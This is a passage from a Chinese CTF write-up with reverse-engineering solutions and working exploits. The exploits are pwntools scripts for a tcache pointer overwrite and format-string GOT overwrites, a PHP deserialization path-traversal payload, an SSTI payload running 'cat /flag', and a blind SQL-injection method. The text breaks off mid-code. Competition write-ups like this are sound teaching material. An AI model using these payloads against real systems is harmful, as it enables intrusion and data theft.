</span></span><span class=line><span class=cl><span class=n>d</span><span class=o>+=</span><span class=nb>chr</span><span class=p>((</span><span class=n>a</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>+</span><span class=mh>0x1f</span><span class=p>)</span><span class=o>//</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d</span><span class=o>=</span><span class=s1>&#39;GoM0bi13_Bin&#39;</span><span class=o>+</span><span class=n>d</span>
</span></span><span class=line><span class=cl><span class=n>c</span><span class=o>=</span><span class=s1>&#39;G3tItEzForRe&#39;</span><span class=o>+</span><span class=n>c</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>d</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#GoM0bi13_BingGo@</span>
</span></span><span class=line><span class=cl><span class=c1>#G3tItEzForRevG0!</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=windows_call>windows_call</h2><p>解出flag前八位</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>z3</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>Solver</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=p>[</span><span class=n>BitVec</span><span class=p>(</span><span class=s2>&#34;flag</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>i</span><span class=p>,</span><span class=mi>16</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>((</span><span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>+</span><span class=mh>0x3800</span><span class=o>-</span><span class=mh>0x10000</span><span class=p>)</span><span class=o>&lt;=</span><span class=mh>0x800</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>((</span><span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>+</span><span class=mh>0x3800</span><span class=p>)</span><span class=o>&gt;</span><span class=mh>0x10000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>((</span><span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>+</span><span class=mh>0x3500</span><span class=o>-</span><span class=mh>0x10000</span><span class=p>)</span><span class=o>&lt;=</span><span class=mh>0x500</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>((</span><span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>+</span><span class=mh>0x3500</span><span class=p>)</span><span class=o>&gt;</span><span class=mh>0x10000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>&amp;</span><span class=mh>0xff00</span><span class=o>&lt;</span><span class=mh>0xca00</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>&amp;</span><span class=mh>0xff</span><span class=o>==</span><span class=mh>0xa0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>-</span><span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>==</span><span class=mh>0x2B8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>v25</span><span class=o>=</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>^</span><span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=o>&amp;</span><span class=mh>0xff</span>
</span></span><span class=line><span class=cl><span class=n>v55</span><span class=o>=</span><span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>^</span><span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=o>&gt;&gt;</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=n>iv</span><span class=o>=</span><span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>v23</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>iv</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>v55</span><span class=o>+</span><span class=n>v23</span><span class=p>)</span><span class=o>^</span><span class=p>(</span><span class=n>v25</span><span class=o>+</span><span class=n>v23</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>v57</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>v37</span><span class=o>=</span><span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=n>v28</span><span class=o>=</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>v27</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>v29</span><span class=o>=</span><span class=n>iv</span><span class=p>[</span><span class=n>v27</span><span class=p>]</span><span class=o>^</span><span class=p>(</span><span class=n>v27</span><span class=o>-</span><span class=mi>64</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>v37</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>v29</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>v28</span><span class=o>+=</span><span class=n>v29</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>v28</span><span class=o>==</span><span class=mh>0x8a8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>s</span><span class=o>.</span><span class=n>check</span><span class=p>()</span> <span class=o>==</span> <span class=n>sat</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>model</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>      <span class=nb>print</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>m</span><span class=p>[</span><span class=n>flag</span><span class=p>[</span><span class=n>i</span><span class=p>]]</span><span class=o>.</span><span class=n>as_long</span><span class=p>()))</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;wrong&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#0xc9e8</span>
</span></span><span class=line><span class=cl><span class=c1>#0xcca0</span>
</span></span></code></pre></td></tr></table></div></div><p>考虑大小端序然后代入提取aes的iv和key</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=mh>0x4d</span><span class=p>,</span><span class=mh>0x4f</span><span class=p>,</span><span class=mh>0x4d</span><span class=p>,</span><span class=mh>0x43</span><span class=p>,</span><span class=mh>0x45</span><span class=p>,</span><span class=mh>0x47</span><span class=p>,</span><span class=mh>0x45</span><span class=p>,</span><span class=mh>0x43</span><span class=p>,</span><span class=mh>0x5d</span><span class=p>,</span><span class=mh>0x5f</span><span class=p>,</span><span class=mh>0x5d</span><span class=p>,</span><span class=mh>0x43</span><span class=p>,</span><span class=mh>0x45</span><span class=p>,</span><span class=mh>0x47</span><span class=p>,</span><span class=mh>0x45</span><span class=p>,</span><span class=mh>0x43</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0x8d</span><span class=p>,</span><span class=mh>0x8e</span><span class=p>,</span><span class=mh>0x8f</span><span class=p>,</span><span class=mh>0x80</span><span class=p>,</span><span class=mh>0x81</span><span class=p>,</span><span class=mh>0x82</span><span class=p>,</span><span class=mh>0x83</span><span class=p>,</span><span class=mh>0x84</span><span class=p>,</span><span class=mh>0x95</span><span class=p>,</span><span class=mh>0x96</span><span class=p>,</span><span class=mh>0x97</span><span class=p>,</span><span class=mh>0x88</span><span class=p>,</span><span class=mh>0x89</span><span class=p>,</span><span class=mh>0x8a</span><span class=p>,</span><span class=mh>0x8b</span><span class=p>,</span><span class=mh>0x8c</span><span class=p>,</span>
</span></span></code></pre></td></tr></table></div></div><p>然后aes解密，拼接即可得到flag，注意前面的大写条件
flag{E8C9A0CC8B9854CDD0AC321B790FC74EFA520FBC}</p><h1 id=mimic>mimic</h1><h2 id=web_mimic>web_mimic</h2><p>将第一行cmd5解开是123
然后将下面的密文 des解密,按照解密后给的步骤直接出flag</p><h2 id=pwn2-1>pwn2-1</h2><p>堆块上放了个函数指针，指向print函数，由于程序给出了一个函数地址，直接算一下偏移就可以得到magic函数的地址，然后释放两个控制堆块进入tcache，申请0x10的chunk拿出控制堆块，然后，其中一个chunk的控制堆块就变成了内容堆块，直接改print地址为magic，就可以得到flag
exp如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#io = process(&#34;./pwn2-1&#34;)</span>
</span></span><span class=line><span class=cl><span class=n>io</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;172.51.122.39&#34;</span><span class=p>,</span> <span class=mi>9999</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>elf</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./pwn2-1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./libc-2.27.so&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span> <span class=o>=</span> <span class=s2>&#34;amd64&#34;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s2>&#34;debug&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Your choice :&#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Note size :&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s2>&#34;Content :&#34;</span><span class=p>,</span> <span class=n>content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>delete</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Your choice :&#34;</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Index :&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Your choice :&#34;</span><span class=p>,</span> <span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Index :&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>tip</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;choice :&#34;</span><span class=p>,</span> <span class=s2>&#34;5&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>tip</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;let us give you some tips</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add_base</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>success</span><span class=p>(</span><span class=s2>&#34;elf base is leaked ==&gt; &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>add_base</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>magic_addr</span> <span class=o>=</span> <span class=n>add_base</span> <span class=o>+</span> <span class=mh>0x980</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x30</span><span class=p>,</span> <span class=s2>&#34;0&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x430</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x40</span><span class=p>,</span> <span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>delete</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x10</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>magic_addr</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>show</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=pwn1>pwn1</h2><p>存在后门函数，并且程序自己泄露了基地址。还有个格式化字符串漏洞。</p><p>利用格式化字符串篡改printf函数的got表为system的地址</p><p>EXP:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tools</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>,</span><span class=n>e</span><span class=p>,</span><span class=n>libc</span><span class=o>=</span><span class=n>load</span><span class=p>(</span><span class=s2>&#34;./pwn1&#34;</span><span class=p>,</span><span class=s2>&#34;172.51.122.26:9999&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s2>&#34;Welcome to mimic world,try something</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=nb>str</span><span class=p>(</span><span class=mi>1</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;You will find some tricks</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base_addr</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(),</span><span class=mi>16</span><span class=p>)</span><span class=o>-</span><span class=mh>0xA94</span>
</span></span><span class=line><span class=cl><span class=n>log_addr</span><span class=p>(</span><span class=s2>&#34;base_addr&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pause</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=n>fmtstr_payload</span><span class=p>(</span><span class=n>offset</span><span class=o>=</span><span class=mi>8</span><span class=p>,</span><span class=n>writes</span><span class=o>=</span><span class=p>{</span><span class=n>e</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>]</span><span class=o>+</span><span class=n>base_addr</span><span class=p>:</span><span class=n>e</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span><span class=o>+</span><span class=n>base_addr</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=pwn1-1>pwn1-1</h2><p>利用思路:
这题和pwn1一样，只不过需要多泄露一下程序基地址即可，继续篡改printf的got表为system的plt即可。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>tools</span> <span class=kn>import</span><span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>,</span><span class=n>e</span><span class=p>,</span><span class=n>libc</span><span class=o>=</span><span class=n>load</span><span class=p>(</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;Welcome to mimic world,try something&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;1&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;You will find some tricks</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>leak_start</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>log_addr</span><span class=p>(</span><span class=s1>&#39;leak_start&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>base_addr</span><span class=o>=</span><span class=n>leak_start</span><span class=o>-</span><span class=mh>0xa94</span>
</span></span><span class=line><span class=cl><span class=n>log_addr</span><span class=p>(</span><span class=s1>&#39;base_addr&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>debug</span><span class=p>(</span><span class=n>p</span><span class=p>,</span><span class=s1>&#39;pie&#39;</span><span class=p>,</span><span class=mh>0xADA</span><span class=p>,</span><span class=mh>0xAEE</span><span class=p>,</span><span class=mh>0xBA8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>printf_got</span><span class=o>=</span><span class=n>base_addr</span><span class=o>+</span><span class=n>e</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s1>&#39;2&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;hello</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=s1>&#39;%9$p&#39;</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>start_addr</span><span class=o>=</span><span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>14</span><span class=p>),</span><span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>log_addr</span><span class=p>(</span><span class=s1>&#39;base_addr&#39;</span><span class=p>)</span>   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>system_addr</span><span class=o>=</span><span class=n>base_addr</span><span class=o>+</span><span class=n>e</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>log_addr</span><span class=p>(</span><span class=s1>&#39;printf_got&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>log_addr</span><span class=p>(</span><span class=s1>&#39;system_addr&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=n>fmtstr_payload</span><span class=p>(</span><span class=n>offset</span><span class=o>=</span><span class=mi>8</span><span class=p>,</span><span class=n>writes</span><span class=o>=</span><span class=p>{</span><span class=n>printf_got</span><span class=p>:</span><span class=n>system_addr</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=web>web</h1><h2 id=ezus>ezus</h2><p>basename函数绕过读源码
<code>/index.php/tm.php/是?source</code>
反序列化字符串逃逸
order类的绕过，用cmd://，会把后面的东西当成文件夹解析，就能绕过host，再目录穿越就行了，wakeup就改成员变量的数量就行了
先读hint.php
<code>username=@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@&amp;password=";s:8:"password";O:5:"order":3:{s:1:"f";s:7:"trypass";s:4:"hint";s:55:"cmd://prankhub/../../../../../../../../../../../../../var/www/html/hint.php";}}</code>
知道了flag文件名，再读就行了
<code>username=@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@&amp;password=";s:8:"password";O:5:"order":3:{s:1:"f";s:7:"trypass";s:4:"hint";s:52:"cmd://prankhub/../../../../../../../../../../../../../../f1111444449999.txt";}}</code></p><h2 id=没有人比我更懂py>没有人比我更懂py</h2><p>无字母ssti，利用Unicode字符、NFKC，命令执行读flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>data={{ｕｒｌ_ｆｏｒ.__ｇｌｏｂａｌｓ__.__ｂｕｉｌｔｉｎｓ__[&#39;__ｉｍｐｏｒｔ__&#39;](&#39;ｏｓ&#39;).ｐｏｐｅｎ(&#39;ｃａｔ /ｆｌａｇ&#39;).ｒｅａｄ()}}
</span></span></code></pre></td></tr></table></div></div><h2 id=popsql>popsql</h2><p>fuzz一下，发现很多关键字都被过滤了，但仔细找找能找到对应代替的函数
利用benchmark代替sleep可以进行时间盲注
表名用sys视图来查，字段名可以用sys.statement_analysis来查看操作记录把flag字段名给爆出来</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
